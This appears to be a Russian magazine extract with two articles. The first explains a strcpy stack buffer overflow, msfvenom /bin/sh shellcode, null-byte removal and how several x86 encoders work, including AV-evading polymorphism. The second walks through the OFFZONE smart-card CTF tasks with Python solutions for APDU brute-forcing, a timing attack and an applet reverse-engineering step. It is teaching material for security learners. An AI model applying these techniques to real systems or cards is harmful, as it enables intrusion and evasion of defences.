   BUFFER OVERFLOW
   Поскольку тема шелл‐кодин га неотделима от экс плуатации бинарных уяз‐
    вимостей, давай рассмотрим небольшой фрагмент  кода, содержащего
    в себе типичный Stack‐based Buﬀer Overﬂow.

    #include <stdio.h> #include <string.h> int main (int argc, char**
    argv)  {     char buffer[100];     strcpy(buffer, argv[1]);     return 0;
    }

    Уязвимость этого кода про исходит из функции strcpy(char *destination,
    const char *source). Вот так выглядит описание этой функции в официаль‐
    ной документации:



           Copies the C string pointed by source into the array pointed by destina-
              tion, including the terminating null character (and stopping at that point).
          To avoid overflows, the size of the array pointed by destination  shall
          be long enough to contain the same C string as source (including the ter-
           minating null character), and should not overlap in memory with source.

   В двух словах: если длина строки (то есть раз ница между адресом первого
    байта строки и адресом первого нулево го байта, именуемого NULL‐тер‐
    минатором), на которую указывает argv[1], боль ше раз мера буфера buffer,
    то произойдет тот самый Stack‐based Buﬀer Overﬂow.





    Если рандомизация адреса стека отключена, ата кующий может предсказать
    то место, куда будут записаны данные. Таким образом, манипуляциями
    с argv[1] можно записать полезную нагрузку в стек, а также подменить
    адрес возврата так, чтобы передать ей управление.





    Если защита от исполнения данных также отклю чена, то шелл‐код будет
    исполнен.
      Хорошим примером полезной нагрузки будет шелл‐код, запускающий
    командную оболочку sh, который можно сгенерировать с помощью msfvenom.





    Здесь и начинается все интересное.


   ЗАЧЕМ НУЖНЫ ЭНКОДЕРЫ?
    Если передать нашей программе стро ку вида argv[1]  =  shellcode  +
    "BBBB" + shellcode_address, то перепол нение не произойдет. Это связано
    с тем, что шестнадцатый байт шелл‐кода равен \x00, так что копирование
    этого буфера в стек прекращается после 15 байт.





    Чтобы разобраться с «плохими» байтами в полезной нагрузке, можно дизас‐
   семблировать шелл‐код и детально его изучить.





   Первое, что бро сается в глаза, — присутс твие инструкции call  0x25
    при том, что ближайшая распознанная инструкция objdump начинается
    с 0x24. Такое часто встречается, ког да требуется передать данные в теле
    самого шелл‐кода. Инструкция call в таком случае очень полезна, пос кольку
   помещает адрес сле дующей инструкции, то есть адрес последу ющих данных,
    в стек.
   Подтвердить эту гипотезу можно, если изу чить байты \x2f\x62\x69\x6e\
   x2f\x73\x68\x00, находя щиеся в диапа зоне 0x1d–0x25, — они представ‐
    ляют собой строку /bin/sh , которую мы  ука зывали в качестве CMD
    при генерации полезной нагрузки.



   Заменив эти байты на NOP’ы в изначальном шелл‐коде, получим более кор‐
    ректную картину.





    Суть этого шелл‐кода сво дит ся к исполнению прерывания int 0x80 с кодом
    0x0b, что соответствует системному вызову SYS_EXECVE. Системные вызовы
    в Linux — это сво еоб разные мос ты между при ложениями и функциями ядра.
   Они позволяют, например, открывать сокеты, читать и записы вать файлы или,
    как в нашем шелл‐коде, запус кать приложения. В частнос ти, он выпол няет
    команду /bin/sh ‐c CMD.
      Вернемся к байтам 0x00. Первый из них возникает при использовании
    инструкции push 0x68732f. Так как мы препарируем шелл‐код для x86, то
   формально эта инструкция записывает в стек зна чение, равное 0x0068732f,
     что, если приглядеться, и указано в опкоде этого вызова — 68 2f 73 68 00.
   Кроме этого, целую кучу байтов 0x00 создает инс трукция call 0x25 с опко‐
   дом e8 08 00 00 00.
      Чтобы избавиться от нулевого байта в первом опкоде, можно заменить
    одну инструкцию push 0x68732f тремя — push edx (52), push 0x68 (6a
    68) и pushw 0x732f (66 68 2f 73). Первая произведет запись значения
    edx (равного 0x00000000) в стек, вторая и третья же запишут нужную строку
      (‐c). От нулей в call 0x25 можно избавить ся, если поместить значение 0x25
    в регистр dl (mov dl, 0x25 — b2 25), а потом вызвать call edx (ff d2).
     В обоих случаях мы опираемся на избыточность набора команд, которая
    приводит к тому, что мож но достичь одного и того же состояния CPU и стека
    с помощью разных инструкций. Замена инс трукций в ручном режиме дает
    нужный результат, но приводит к значительному усложнению генерации
    полезной нагрузки. Это осо бенно акту ально в случае с шелл‐кодами для Win‐
    dows, размер которых может быть гораз до боль ше размеров аналогичных
    нагрузок для Linux.





   Кроме этого, изменение инс трукций, скорее всего, при ведет к изменению
    длины  соответствующих  участков  кода,  что  сломает  ветвление  типа
    JMP/CALL, — поэтому придется занимать ся еще и отслеживанием сме‐
    щений.
      Хорошая новость состоит в том, что такие вещи можно автоматизировать.
    Программа, выпол няющая некото рое преобра зова ние байтов шелл‐кода так,
    чтобы избе жать присутствия «пло хих» байтов, называ ется энкодером.
     Со времени появления концепции подходы к кодированию полезных наг‐
    рузок сильно менялись. Например, некоторые энкодеры позволяют не только
    избавиться от «плохих» байтов, мешающих эксплу атации, но и обойти средс‐
    тва защиты типа IPS и AV. При этом считать, что энкодеры созданы для того,
    чтобы обходить средства  защиты, по меньшей мере неправильно —
    это полезное свойство очень силь но зависит от схемы работы конкретного
    энкодера.


   MSFVENOM ENCODERS
   x86/xor_dynamic
    Это энкодер, использующий x86 XOR с динамичес кой длиной ключа.
     Одна из самых распростра ненных схем работы энкодеров — это схема
    со Stub‐декоде ром.





   Кодирование шелл‐кода при такой схеме состоит из двух частей:
      1. Преобразование изна чального пейлоада таким образом, чтобы избе жать
      присутствия «плохих» байтов.
      2. Добавление  кода,  который  выполняет  обратное  преобразование
      и передает управление оригинальному шелл‐коду в опе ративной памяти.

   Соответственно, при исполнении закодированной полезной нагрузки первым
   делом выполняется  Stub, который раскодирует оригинальный шелл‐код
    и передает ему управление. Пример реализации такой схе мы — это и есть
    x86/xor_dynamic. В качестве преобразова ния используется операция XOR
    с клю чом переменной длины. При этом длина и значение ключа зависят
    от «плохих» байтов.
      Чтобы лучше понять работу это го энкодера, давай дважды сге нерируем
    уже знакомый нам шелл‐код linux/x86/exec с применением x86/xor_dynamic
    и посмотрим, чем отличаются результаты.





   Синим цветом отмечен Stub — код, который расшифровывает шелл‐код
    в памяти и исполняет его. Первый выделен ный красным фрагмент кода заг‐
    ружает первоначальное зна чение ключа в регистр AL, второй и тре тий
    используются для определения начала и конца закодированных данных. Фак‐
    тически все отличия в Stub сво дятся к этим двум моментам.
      При этом здесь используется тот же трюк для передачи указателя на дан‐
    ные, что мы видели на примере шелл‐кода linux/x86/exec, — с помощью инс‐
    трукции call указатель на данные помещается в стек в качестве адреса воз‐
    врата, откуда его можно легко забрать с помощью инструкции pop. Пос ле
    того как оригинальный шелл‐код декодирован, ему передается управление
    инструкцией jmp ecx.
      Несмотря  на простоту  x86/xor_dynamic и  на  то,  что добавляемый
     к шелл‐коду объем данных невелик, этот метод тоже не лишен недостатков.
   В частности, если один из байтов Stub «пло хой» (а общее число байтов Stub
    в x86/xor_dynamic гораздо больше, чем, ска жем, в x86/add_sub) и недопустим
    для использования в полезной нагрузке, то с этим ничего не удастся сделать
    и придется использовать другой энкодер.


   x86/add_sub
   Кодирует пейлоад при помощи инс трукций add и sub. Идея взята из боевого
    эксплоита HP NNM. Его фишка в том, что в полезной нагрузке разрешена
    только треть всего диапазона 0x00–0xFF. Это накладывает сильные ограниче‐
    ния на пейлоад — насколько нам известно, ни один энкодер, кроме этого (и
   еще пары alphanumeric, которые реализуют принципиально иной подход),
    не осилит маскировку пло хих байтов в таких условиях.
     Энкодер x86/add_sub делит исходный шелл‐код на учас тки, а потом пред‐
    ставляет каждый из них в виде суммы или разности нескольких значений. Так
    как операции add и sub в x86 работа ют с 32‐битными блоками, то попытка
    применить этот энкодер к шелл‐коду, имеюще му длину, не кратную четырем,
    будет приводить к неудаче.





   Кроме того, этот энкодер не предусматри вает передачу исполнения исходно‐
    му шелл‐коду ˉ\_(ツ)_/ˉ. С дру гой стороны, если дело дошло до примене‐
    ния этого энкодера, то передача управления точно не сос тавит труда.
      Если мы дизассемблируем закодированный шелл‐код linux/x86/exec, то
    увидим что‐то подоб ное вот такому лис тингу.





    Здесь видно,  что каждый отдельный четырехбайтовый блок исходного
    шелл‐кода сначала собирается в регистре eax с помощью инструкций and
    и add, а потом размещается в стеке с помощью инструкции push. В случае
    если байт 0x05 (опкод инструкции add) «плохой», в качес тве основной ариф‐
    метической опе рации использует ся вычитание и соответству ющая ему инс‐
    трукция sub.
      Фактически энкодер x86/add_sub поз воляет представить шелл‐код в виде
    последовательности четырех инс трукций и их операндов, что делает его
    потенциально применимым даже в самых сложных случаях, когда набор раз‐
   решенных для исполь зования байтов крайне огра ничен.


    x86/alpha_mixed
    Этот энкодер кодирует полезную наг рузку как цифро‐буквенную строку с раз‐
   ными регистром букв. Такие шелл‐коды называ ют venetian shellcode.
      Какое‐то время назад фильтрация входящих данных по принципу соот‐
    ветствия символам какой‐либо кодировки дей ствительно рассматривалась
    как одна из эффективных мер противо дей ствия бинарной эксплуатации, пока
    в 2002 году Крис Анли в своей культовой статье Creating Arbitrary Shellcode
     In Unicode Expanded Strings не показал, что это не так и что даже с помощью
    инструкций  с  опкодами,  соответс тву ющими символам  Unicode, можно
    добиваться полноценного исполнения кода.
      Чтобы обеспечить преобра зование бай тов шелл‐кода в цифро‐буквенную
    последовательность, энкодер x86/alpha_mixed использует движок Alpha2
    за авторством SkyLined. Использование этого движка име ет одну побочную
    особенность: фактически  x86/alpha_mixed генерирует самомодифициру‐
   ющийся шелл‐код, поэтому во время исполнения ему необходимо знать свой
    собственный адрес.
      Если мы сгенерируем шелл‐код без дополнительных параметров энко‐
    дера, то мы увидим сле дующую картину.





   Перед понятной последова тельностью ASCII‐символов будет идти несколько
    непечатных. Эта часть как раз и выполняет определение позиции шелл‐кода
    в памяти.
     Довольно часто во время экс плуатации уяз вимос ти на шелл‐код указывает
    некоторый регистр CPU. Очевидно, что в таком слу чае нам не нужно про‐
    водить дополнительные операции, чтобы определить положение шелл‐кода
    в памяти, и мы можем избавиться от час ти бай тов, портящей нашу бук‐
    венно‐цифровую картину.  Энкодер x86/alpha_mixed поддерживает передачу
    такого регистра в виде параметра BufferRegister.





   В общих чертах энкодер x86/alpha_mixed исполь зует ту же схему декодирова‐
    ния, что и x86/xor_dynamic, — в коде предусмотрен определенный Stub,
    который декодирует оригинальный шелл‐код в памяти и передает ему
    управление.





    Тема venetian shellcode зас луживает отдельной статьи, поэтому всем заин‐
    тересованным рекомендую озна комиться с публикацией автора.


  ВЫВОД
    Msfvenom предлагает на выбор 23 энко дера полез ных нагрузок для x86. Каж‐
   дый из них имеет определенные ограничения и сферы применения, где они
    максимально эффективны.
      Например, энкодер x86/add_sub нужно дополнительно кас томизировать
    для работы, хоть он и предлага ет наибольшую гиб кость, x86/alpha_mixed поз‐
    воляет запустить полезную наг рузку в усло виях, ког да разрешены только бук‐
   вы и цифры, но для пол ноценной работы может требовать указания Buffer‐
    Register, а x86/xor_dynamic не требует ничего, но бессилен против «плохих»
    байтов, которые есть в исходнике декодера.
       Как было сказано в начале, авторы некоторых энкодеров ставили своей
    задачей не только сокрытие «пло хих» байтов, но и обход средств защиты.
   Среди таких энкодеров, например, x86/shikata_ga_nai. Это полиморфный
    энкодер, который производит разные полезные наг рузки при каждом запуске
     так, что формирование единой сигнатуры для IPS или AV просто невозможно.
      Таким образом, выбор энкодера сильно зависит от их назначения и осо‐
    бенностей реализации, которые можно понять, изу чив исходники энкодеров
    или отреверсив полезную нагрузку. Исходный код Metasploit Framework вмес‐
    те со все ми энкодерами опуб ликован на GitHub, поэтому ничто не мешает
    провести пару вечеров, раз бираясь с темой.
 ВЗЛОМ

ПОИГРАЕМ
          ?В КАРТЫ

 ПОЛНОЕ ПРОХОЖДЕНИЕ
 ЗАДАНИЙ СО СМАРТ‐КАРТАМИ
 OFFZONE BADGE CHALLENGE





     Dmitry Sklyarov             Антон Дорфман         Александр Леонтьев          Никита Абрамов
Руководитель отдела анализа
    приложений Positive
        Technologies




 На OFFZONE была серия задач на смарт‐карте с интерфей‐
 сом ISO/IEC 7816. Особо внимательных даже предупредили
 заранее. Тут опубликовали фотографию бейджа и прямо
 заявили,  что «бейдж можно будет взломать, если вам
 это будет по силам». Нам ока залось это по силам, и из этой
 статьи ты узнаешь — как. :)


  Чтобы решать задачи, нуж но было иметь подходящий картридер. Те, кто при‐
 шел на конферен цию неподготовленным, имели возможность приобрести
  картридер в «Лавке старь евщика» за OFFCOIN или российские рубли. Прав‐
  да, продавалось всего 30 ридеров, и их быс тро разоб рали.
    Описание задач было приведено на этой странице.


 ОФИЦИАЛЬНЫЕ ЗАДАНИЯ
  Авторы заданий сделали очень хорошее «краткое введение» в терминологию,
 базовые принципы и популярные инстру менты.


 Как работать с кар той
 Общение со смарт‐картами ведется при помощи USB‐картридеров, которые
 можно найти в GAME.ZONE, а также купить в «Лавке старьевщика».APDU‐
  команда
    Пакеты, которые воспринимает карта, называ ются APDU‐командами.
 APDU‐команда  представляет  собой  последовательность  4‐байтового
  заголовка и данных команды.
   Общий формат APDU‐команды:
  • [CLA INS P1 P2 Lc DATA Le]
  • CLA (Instruction class) определяет тип посыла емой команды.
  • INS (Instruction code) определяет конкретную команду внутри класса.
  • P1, P2 (Parameter 1/2) являются аргу ментами команды.
  • Lc (Length of command data) определяет размер данных в поле DATA.
  • DATA (?) содержит в себе Lc байт данных команды.
  • Le (Length of expected data) определяет раз мер данных, которые ожи дает‐
    ся получить в ответе карты.

 Команда обязательно содержит 4 первых байта, остальные байты опци ональ‐
  ны. В ответ мы получаем код ошибки, состоящий из 2 байт (SW1, SW2),
  и опциональное поле данных раз мера <= Le байт.
    Для отправки APDU‐команд удобно пользовать ся библиоте кой pyscard
  для Python. Например, так выглядит код для получения серийного номера
  Java‐карты:


  from smartcard.System import readers
  from smartcard.util import *
  r = readers()
  reader = r[0x00] # Let's assume that we only have one reader
  connection = reader.createConnection()
  connection.connect()
  SELECT_MANAGEMENT = [0x00, 0xA4, 0x04, 0x00, 0x08] + [0xA0, 0x00,
  0x00, 0x00, 0x03, 0x00, 0x00, 0x00]
  (data, sw1, sw2) = connection.transmit(SELECT_MANAGEMENT)
  GET_CPLC_DATA = [0x80, 0xCA, 0x9F, 0x7F, 0x00]
  (data, sw1, sw2) = connection.transmit(GET_CPLC_DATA)
  print data


 Если давать высоко уровневое описание Java‐карты, то она представляет
 собой  совокупность  Java‐апплетов,  которые  выполняют  определенные
  задачи. Апплеты идентифицируются с помощью уникального Applet Identiﬁer
  (AID), задаваемого при разработке апплета. По умолчанию Java‐карта дол жна
 содержать Manager‐апплет (AID = [0xA0, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
  0x00]), который исполь зуется для управления другими апплетами на карте.
  Задания также представляют собой отдельные апплеты. Перед началом
  работы с апплетом нужно выполнить команду SELECT и AID апплета:


  AID=[...]
  SELECT_APPLET = [0x00, 0xA4, 0x04, 0x00] + [len(AID)] + AID




 В качестве основного способа общения с картой предполагалось исполь‐
  зовать язык Python и библиотеку pyscard. Небольшая сложность, с которой
  лично я столкнулся на начальном этапе, была в том, что я не нашел готового
  инсталлятора и не справился со сборкой pyscard под Python 3.7. А после уста‐
  новки старой версии pyscard 1.7.0 под Python 2.7 выяснилось, что простей‐
 шие примеры из документации pyscard пада ют с ошибкой. Зато связ ка
  pyscard 1.9.3 и Python 3.6.7 x64 заработала сра зу и без нареканий.
    Так как во всех задани ях требова лось выполнять однотипные действия
  (инициализация,  отсылка APDU‐команд и  получение  результатов), мне
  показалось правильным реализовать базовые функции в виде клас са.


  from smartcard.System import readers
  def hx(ab): return ".".join("%02X" % v for v in ab) # Convert bytes
  to hex
  def sx(ab): return "".join(chr(v) for v in ab) # Convert bytes to
  string
  SELECT_APPLET = [0x00, 0xA4, 0x04, 0x00]
  class OFFZONE(object):
    dCmds = { # List of known commands (for debugging)
      hx(SELECT_APPLET): "SELECT_APPLET",
    }
    def __init__(self, ind=0):
      self.DBG = False
      self.r = readers()
      if self.DBG:
        if self.r:
          print("Readers:")
          for i, v in enumerate(self.r):
            print("%3d: %s" % (i, v))
        else: print("No readers")
      self.conn = self.r[ind].createConnection()
      self.conn.connect()
    def exch(self, cmd, arg=None): # Perform APDU command exchange
      if self.DBG:
        msg = [self.dCmds.get(hx(cmd), hx(cmd))]
        if arg is not None: msg.append(hx(arg))
        print("Send: %s" % " + ".join(msg))
      ext = [] if arg is None else [len(arg)] + list(arg)
      data, sw1, sw2 = self.conn.transmit(cmd + ext)
      if self.DBG:
        print("Recv: %02X.%02X + [%s]" % (sw1, sw2, hx(data)))
      return data, sw1, sw2
    def select(self, AID): # Select applet by AID or task index
      if isinstance(AID, int): # Task index provided
        AID = [0x4F, 0x46, 0x46, 0x5A, 0x4F, 0x4E, 0x45, 0x30+AID, 0x10
  , 0x01]
      return self.exch(SELECT_APPLET, AID)
    def command(self, cla, ins, arg=None): # Execute command
      cmd = [cla, ins, 0, 0]
      return self.exch(cmd, arg)
  def main():
    oz=OFFZONE()
  #  Task1(oz)
  #  Task2(oz)
  #  Task3(oz)
  #  Task4(oz)


 TRAINING MISSION

 Получите основные навыки для работы с Java‐картой.Похоже, при переносе
 описания задания затерлась часть информа ции, и мы потеряли корректный
 номер INS.
  • AID: [0x4f,  0x46,  0x46,  0x5a,  0x4f,  0x4e,  0x45,  0x31,
    0x10, 0x01]
  • CLA: 0x10
  • INS:
     • 0x??: getFlag: [0x10, 0x??, 0x00, 0x00]
     • 0xE0: checkFlag(flag):
        • [0x10, 0xE0, 0x00, 0x00, 0xNN] + flag (0xNN bytes of ﬂag)



 В первой задаче требова лось найти однобайтовое значение INS, и очевидно,
  что проще всего это было сделать перебором 256 воз можных вариантов.


 Ре шение
  def Task1(oz):
    print("\nTask #1 (Training Mission)")
    oz.select(1)
    CLA = 0x10
    INS_CheckFlag = 0xE0
    for INS_GetFlag in range(0x100):
      data, sw1, sw2 = oz.command(CLA, INS_GetFlag)
      if 0x90 == sw1 and 0x00 == sw2 and data:
        print("INS_GetFlag=0x%02X, Flag: %s" % (INS_GetFlag, repr(sx(
  data))))
        data, sw1, sw2 = oz.command(CLA, INS_CheckFlag, data)
        print("CheckFlag: %02X.%02X + [%s]" % (sw1, sw2, hx(data)))
        break
    else:
      print("INS_GetFlag value not found")

  Легко заметить, что на большинс тво запросов (с неподдерживаемы ми зна‐
  чениями INS) в качестве ста туса ответа (sw1 и sw2) возвращаются значения
  0x6D и 0x00. Если свериться с таб лицей кодов APDU‐ответов, становится
  понятно, что 6D 00 соответс твует ошибке Instruction code not supported or in‐
  valid. Для правильного запроса возвра щает ся ста тус 90 00 и флаг.


 VAULT WAREHOUSE MANAGEMENT SYSTEM

 Убежище — это сложный инженерный объект, который поз воляет людям
  выживать в условиях ядерной войны. Тебе предстоит оптимизировать хра‐
  нение припасов в условиях огра ниченного пространс тва. Перемести коробки
  с провиантом в специально предназначенные для этого места.
  • AID: [0x4f,  0x46,  0x46,  0x5a,  0x4f,  0x4e,  0x45,  0x32,
    0x10, 0x01]
  • CLA: 0x10
  • INS:
     • 0x20, move() — задать направление дви жения. В APDU необходимо
       передать один байт с указанием нап равления:
        • a (0x61) — влево,
        • d (0x64) — впра во,
        • w (0x77) — вверх,
        • s (0x73) — вниз.
     • 0x30: getGameState() — получить текущий статус (получить карту
       в виде списка из 108 байт).

 Пример движения влево: apdu = [0x10, 0x20, 0x00, 0x00, 0x01, 0x61].
 Игровое поле 12x9: apdu = [0x10, 0x30, 0x00, 0x00, 0x00].
    Легенда:
  • ты — «H » (0x48),
  • стена — «# » (0x23),
  • коробки с провиантом — «O » (0x4f),
  • специально отведенное мес то для хра нения — «. » (0x2e),
  • свободное пространство — «» (0x20).

 Если ты успешно оптимизировал хранение в паре залов, в ответ на запрос
  получишь флаг.
  • 0x40: reset() — если попал в безвыходную ситуацию. apdu = [0x10,
    0x40, 0x00, 0x00, 0x00]
  • 0x50: getFlag() apdu = [0x10, 0x50, 0x00, 0x00, 0x00]
  • 0xE0: checkFlag(flag)  apdu  =  [0x10,  0xE0,  0x00,  0x00,
    0xNN] + flag (0xNN bytes of ﬂag)



 В этом задании предлага ют поиграть в Sokoban. Ничего технически сложного
  делать не требуется. Если пос лать команду getGameState(), в ответ пришлют
  картинку с полем. Посылая команду move(), можно изменять состояние поля.
  Как только новое состояние совпадет с решени ем (все коробки с провиантом
  на отведенных местах), getGameState() вернет картинку со следующим уров‐
 нем (их все го два).





 После решения второго уровня getGameState() вернет флаг.
    Делать полный автомат было лень, поэтому я решил написать инте рак‐
  тивную  программу,  которая  клавишами  awsd  позволяла  двигаться,
  при нажатии на r вызывала reset(), а при нажатии на любую другую клавишу
  завершала работу.


  from msvcrt import getch
  def Task2(oz):
    print("Task #2 (Vault Warehouse Management System)")
    oz.select(2)
    CLA = 0x10
    INS_Move = 0x20
    INS_GetState = 0x30
    INS_Reset = 0x40
    INS_GetFlag = 0x50
    INS_CheckFlag = 0xE0
    while True:
      data, sw1, sw2 = oz.command(CLA, INS_GetState)
      if len(data) != 12*9: break
      print()
      # Show field
      for o in range(0, len(data), 12): print(sx(data[o:o+12]))
      ch = ord(getch())
      if chr(ch) in ("awsd"):
        oz.command(CLA, INS_Move, [ch]) # Make move
      elif ord('r') == ch:
        oz.command(CLA, INS_Reset) # Reset field
      else:
        return # Quit
    print("Final state: %s" % sx(data))
    data, sw1, sw2 = oz.command(CLA, INS_GetFlag)
    if 0x90 == sw1 and 0x00 == sw2 and data:
      print("Flag == %s" % repr(sx(data)))
      data, sw1, sw2 = oz.command(CLA, INS_CheckFlag, data)
      print("CheckFlag: %02X.%02X + [%s]" % (sw1, sw2, hx(data)))

 Под Windows удобно было использовать getch из биб лиотеки msvcrt. Под Unix
 можно воспользоваться модулем getch.py.
    Для совсем ленивых — вот пос ледовательность ходов для первого уровня:


  aaawwdassdddwdwwaasswaassddwdddssaawssaawsddwwawwaassddwds

 И для второго:


  aaaaasaawwssddwdddddwwwwaassaaaawaasdssddddddsdwwwwdwaadssssaaaaaaaww
  wddsddwwwdsassaaawasswddddwwdddssssaaaaaasaawdwwdddddwawddassaa
  aaasssddwdddddwwwdwwasswaassaaaaassddddddsdw

 А если захочется поиграть сначала — нуж но опять вызвать reset().


 COMPARER 2000
  Эта программа досталась нам от пред ков вида Macaca JSus. Они не уме ли
  оптимизировать код, и их программы работа ли медленно.
  • AID: [0x4F,  0x46,  0x46,  0x5A,  0x4F,  0x4E,  0x45,  0x33,
    0x10, 0x01]
  • CLA: 0x10
  • INS:
     • 0x20: checkStr(str)  apdu  =  [0x10,  0x20,  0x00,  0x00,
      0xNN] + STR (0xNN bytes of STR). Ответ: SW_WRONG_PIN_LEN  =
      0x6420, SW_WRONG_PIN = 0x6421
     • 0x30: getFlag() apdu = [0x10, 0x30, 0x00, 0x00, 0x20]
     • 0xE0: checkFlag(flag) apdu = [0x10, 0xE0, 0x00, 0x00,
      0xNN] + flag (0xNN bytes of ﬂag)

 В условии этой задачи дается подсказ ка, что надо сначала подобрать длину
  строки (пока не вернут статус 64 21), а потом использовать Timing Attack (чем
  больше правильных символов, тем дольше будет идти проверка).


 Ре шение
  import time
  def Task3(oz):
    print("\nTask #3 (Comparer 2000)")
    oz.select(3)
    CLA = 0x10
    INS_CheckStr = 0x20
    INS_GetFlag = 0x30
    INS_CheckFlag = 0xE0
    for ccKey in range(1, 16): # Guess length
      data, sw1, sw2 = oz.command(CLA, INS_CheckStr, [0]*ccKey)
      if 0x64 == sw1 and 0x21 == sw2:
        print("len(Key)=%X" % ccKey)
        break
    else:
      print("Can't guess key length")
    abKey = bytearray(ccKey)
    for iKey in range(ccKey): # Walk positions
      bestTime = 0
      bestChar = 0
      for i in range(0x100): # Test all possible values
        abKey[iKey] = i
        start = time.time() # Start measure time
        oz.command(CLA, INS_CheckStr, abKey)
        delta = time.time() ‐ start # Calc command execution time
        if delta > bestTime: # Memorize best value
          bestTime = delta
          bestChar = i
      abKey[iKey] = bestChar
      print(hx(abKey[:iKey+1]), end='\r')
    print
    data, sw1, sw2 = oz.command(CLA, INS_CheckStr, abKey)
    if 0x90 == sw1 and 0x00 == sw2:
      print("Key %s is OK" % hx(abKey))
      data, sw1, sw2 = oz.exch([CLA, INS_GetFlag, 0, 0, 0x20])
      if 0x90 == sw1 and 0x00 == sw2 and data:
        print("Flag == %s" % repr(sx(data)))
        data, sw1, sw2 = oz.command(CLA, INS_CheckFlag, data)
        print("CheckFlag: %02X.%02X + [%s]" % (sw1, sw2, hx(data)))


 УБЕЖИЩЕ 42
 Подбери верный ключ и попади в убежище 42!
  • AID: [0x4F,  0x46,  0x46,  0x5A,  0x4F,  0x4E,  0x45,  0x34,
    0x10, 0x01]
  • CLA: 0x20
  • INS:
     • 0x04: checkLoginAndPassword(login_and_password) apdu = [
      0x20, 0x04, 0x00, 0x00, 0xNN] + data (0xNN bytes of data)
     • 0xE0: checkFlag(flag) apdu = [0x20, 0xE0, 0x00, 0x00,
      0xNN] + flag (0xNN bytes of ﬂag) https://ctf.bi.zone/ﬁles/applet.cap

 Из текста задания оче видно, что надо проана лизировать applet.cap и извлечь
  алгоритм проверки пароля. Поиск в Google приводит на страничку с докумен‐
  тацией Oracle, где упомина ется утилита normalizer.bat. Ставим Java Card SDK
  и выполняем сле дующие команды (пути могут быть другими!):


  SET JAVA_HOME=C:\Program Files\Java\jdk1.8.0_191
  SET JCDK=C:\Program Files (x86)\Oracle\Java Card Development Kit 3.0.
  5u3
  "%JCDK%\bin\normalizer.bat" normalize ‐i applet.cap ‐p "%JCDK%\a
  pi_export_files"

  Но, к сожалению, запуск normalizer.bat завершается ошибкой:



   INFO: Cap File to Class File conversion in process.
   In method Descriptor[43]/Method[15]:
   At PC 0: Bad branch to PC 3 from PC 0


 Из сообщения об ошибке можно сделать вывод, что скомпилированный код
  в файле applet/javacard/Method.cap из applet.cap содержит по адресу 0 неп‐
  равильный переход на адрес 3 (в середину инс трукции). Поискав java card in‐
  struction set, легко выяснить, что опкод 0x70 соответству ет инструкции goto.
    Заглянув внутрь applet/javacard/Method.cap при помощи шестнадцатерич‐
  ного редактора, можно заметить, что довольно час то встречается последова‐
  тельность байт 70 03 xx и именно она «лома ет» работу normalizer.bat — xx
  интерпретируется как начало следующей инс трукции после двухбай товой
  инструкции 70 03 (goto PC+3).


              INFO

                          Кстати, подобный прием (переход в середину
                        инструк ции) часто использует ся и в Native‐коде
                         для запутывания дизассемблера.


 В случае Java Card устра нить проблему доволь но просто — надо на место
  всех xx вставить 00 — однобайтовый опкод инс трукции nop. Это легко сде‐
  лать на Python, исполь зуя модули zipfile и re.


  import zipfile, re
  with zipfile.ZipFile("applet.cap") as zin:
    with zipfile.ZipFile("applet_fixed.cap", "w") as zout:
      for item in zin.infolist():
        ab = zin.read(item.filename)
        if item.filename.endswith("Method.cap"):
          ab = re.sub("p\3.", "p\3\0", ab.decode("latin1")).encode(
  "latin1")
        zout.writestr(item, ab)

 После этого надо повторно запус тить normalizer.bat (поменяв имя вход‐
  ного файла на applet_fixed.cap). И, несмотря на новое сообщение
 об ошибке, в поддиректории applet появится файл AAA.class, который мож‐
 но обработать любым декомпилятором Java (например, старым добрым jad.
  exe) и получить исходный текст, пригод ный для анализа.
    Все     самое      интересное     происхо дит      в     методе
  method_token255_descoﬀ79(). На вход он при нимает 16‐байтовый массив (lo‐
  gin), а возвращает другой 16‐байтовый массив (password). И именно эти два
 массива надо передать в APDU‐команду checkLoginAndPassword().
    Код вычисления password из login похож на кусочки AES. Но раз бираться
  с тем, как он работает, необязательно — достаточно или переписать его
  на привычный язык (например, Python), или слегка подправить и скомпилиро‐
  вать исходник на Java.


 Ре шение
  def aRol(a, n): return a[n:] + a[:n]
  def bX(b): return ((b << 1) ^ 0x1B) & 0xFF
  def bB(b): return bX(b) ^ b
  def transform(a0, a1, a2, a3):
    o0 = [((bX(a0[i]) ^ bB(a1[i])) ^ a2[i]) ^ a3[i] for i in range(4)]
    o1 = [((a0[i] ^ bX(a1[i])) ^ bB(a2[i])) ^ a3[i] for i in range(4)]
    o2 = [((a0[i] ^ a1[i]) ^ bX(a2[i])) ^ bB(a3[i]) for i in range(4)]
    o3 = [((bB(a0[i]) ^ a1[i]) ^ a2[i]) ^ bX(a3[i]) for i in range(4)]
    return o0 + o1 + o2 + o3
  def PwdFromLogin(login):
    ab = [(login[i] ‐ 3*i) & 0xFF for i in range(16)]
    a0 = aRol(ab[0:4], 1)
    a1 = aRol(ab[4:8], 2)
    a2 = aRol(ab[8:12], 3)
    a3 = aRol(ab[12:16], 1)
    ab = transform(a0, a1, a2, a3)
    return [(ab[i] + 127*(i+1)) & 0xFF for i in range(16)]
  def Task4(oz):
    print("\nTask #4 (Shelter 42)")
    oz.select(4)
    CLA = 0x20
    INS_CheckLoginAndPassword = 0x04
    INS_CheckFlag = 0xE0
    login = [i for i in range(16)]
    pwd = PwdFromLogin(login)
    data, sw1, sw2 = oz.command(CLA, INS_CheckLoginAndPassword, login+
  pwd)
    if 0x90 == sw1 and 0x00 == sw2 and data:
      print("Flag == %s" % repr(sx(data)))
      data, sw1, sw2 = oz.command(CLA, INS_CheckFlag, data)
      print("CheckFlag: %02X.%02X + [%s]" % (sw1, sw2, hx(data)))




                                       Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ПОИГРАЕМ В КАРТЫ?
                ПОЛНОЕ ПРОХОЖДЕНИЕ ЗАДАНИЙ
             СО СМАРТ‐КАРТАМИ OFFZONE BADGE
                                   CHALLENGE





SMARTCARDTANKS
Для начала хотелось бы отметить, что орга низа торы выб рали очень интерес‐
ный формат распределения су вениров и активностей для зарабатывания OF‐
FCOIN, атмосфера на конференции из‐за этого сло жилась особенная. Велот‐
рек, настольный зомби‐кикер, тотализатор и про чее — все это не обошло
и нас. Поскольку картридеров у нас не было, то решили для получения завет‐
ного картридера, раз их так мало, общими усилиями во что бы то ни стало
накрутить педали и выиграть максимальное количество «футбольных» сопер‐
ников, а затем купить девайс за OFFCOIN и впервые окунуться в мир Java‐
апплетов.
   Игрокам необходимо реализовать игровую логику своего танка так, чтобы
